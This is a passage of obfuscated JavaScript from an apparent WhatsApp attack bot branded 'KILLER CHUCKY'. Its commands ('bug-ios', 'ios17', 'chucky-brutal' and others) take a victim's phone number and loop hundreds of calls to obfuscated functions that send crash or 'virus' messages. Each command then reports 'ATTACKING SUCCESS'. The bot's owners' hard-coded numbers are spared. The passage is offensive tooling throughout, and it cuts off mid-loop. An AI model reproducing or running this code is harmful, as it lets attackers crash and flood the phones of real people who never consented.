          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
          await _0xe3a42f(target, Ptcp = true);
          await _0x2f7ba8(target, Ptcp = true);
        }
        _0x3b9923("「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」\n  💧⃟𒆜𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕⃟╳🐦‍🔥\n│──▄────▄▄▄▄▄▄▄────▄───│\n│─▀▀▄─▄█████████▄─▄▀▀──│\n│─────██─▀███▀─██──────│\n│───▄─▀████▀████▀─▄────│\n│─▀█────██▀█▀██────█▀──│\n│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : " + target + " ༂         \n│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0x4ae68c + " ༂\n│\n╚─────「 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 」──");
        break;
      case "bug-ios":
        {
          if (!q) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : Android Number_\n_Example : " + (_0x3a5987 + _0x4ae68c) + " 234xx_\n");
          }
          let {
            proto: _0x2efd2e,
            generateWAMessageFromContent: _0x30cd6d
          } = require("@whiskeysockets/baileys");
          incTarget = _0x40d288.split("|")[0].replace(/[^0-9]/g, "");
          if (incTarget.startsWith("0")) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : Android Number_\n_Example : " + (_0x3a5987 + _0x4ae68c) + " 234xx_\n");
          }
          let _0x13251e = incTarget + "@s.whatsapp.net";
          if (owner.includes(incTarget)) {
            _0x3b9923("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!");
          } else {
            await _0x34c772();
            await _0x3b9923(mess.bugrespon);
            global.jumlah = _0x40d288.split("|")[1];
            for (let _0x1fc334 = 0; _0x1fc334 < 20; _0x1fc334++) {
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
              await _0x2f7ba8(_0x13251e, Ptcp = true);
              await _0xe3a42f(_0x13251e, Ptcp = true);
            }
            _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n     *𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + target + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n");
          }
        }
        break;
      case "ios17":
      case "ios18":
      case "blast-ios":
      case "kingmarx":
      case "frezze-ios":
      case "nameless-ios":
      case "off-ios":
      case "slay-ios":
      case "bang-ios":
      case "x-ios":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("\n𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\nUse country code 234,\nhere's how to use it. \n*Example:* " + (_0x3a5987 + _0x4ae68c) + " 234");
          }
          let _0x2b0506 = _0x21f0d9.mentionedJid[0] ? _0x21f0d9.mentionedJid[0] : _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0x3cd99e = ["2348108778025", "2348127185979", "2349063791511"];
          if (_0x3cd99e.includes(_0x2b0506.replace("@s.whatsapp.net", ""))) {
            return _0x3b9923("Sorry, I can't harm my master!\nNumber: " + _0x2b0506.replace("@s.whatsapp.net", ""));
          }
          if (_0x2b0506.startsWith("0")) {
            return _0x3b9923("Don't use 08! Use country code 234. *Example:* " + (_0x3a5987 + _0x4ae68c) + " 234");
          }
          await _0x96020a(1000);
          _0x3b9923("𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\nBot successfully sends a virus message to the target\nNumber : " + _0x2b0506 + " \nVirus/Bug : " + _0x4ae68c);
          await _0x3b9923(mess.bugrespon);
          for (let _0xe1c0ce = 0; _0xe1c0ce < 7; _0xe1c0ce++) {
            await _0x3ade30(_0x2b0506);
          }
          _0x3b9923("『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝛁𝟕*\n\n𝐓𝐀𝐑𝐆𝐄𝐓 : " + _0x2b0506 + "\n𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆");
        }
        break;
      case "chucky-brutal":
        {
          if (!q) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : Android Number_\n_Example : chucky-brutal 234xx_\n");
          }
          let {
            proto: _0x6ab669,
            generateWAMessageFromContent: _0x17268b
          } = require("@whiskeysockets/baileys");
          incTarget = _0x40d288.split("|")[0].replace(/[^0-9]/g, "");
          if (incTarget.startsWith("0")) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : Android Number_\n_Example : combobrutal 62xx_\n");
          }
          let _0x1185c2 = incTarget + "@s.whatsapp.net";
          if (owner.includes(incTarget)) {
            _0x3b9923("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!");
          } else {
            await _0x34c772();
            await _0x3b9923(mess.bugrespon);
            global.jumlah = _0x40d288.split("|")[1];
            for (let _0x46802d = 0; _0x46802d < 20; _0x46802d++) {
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              ;
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
              await _0xe3a42f(_0x1185c2, _0x34a350, Ptcp = true);
              await _0x2f7ba8(_0x1185c2, null, _0x2f7ba8, cct = true, ptcp = true);
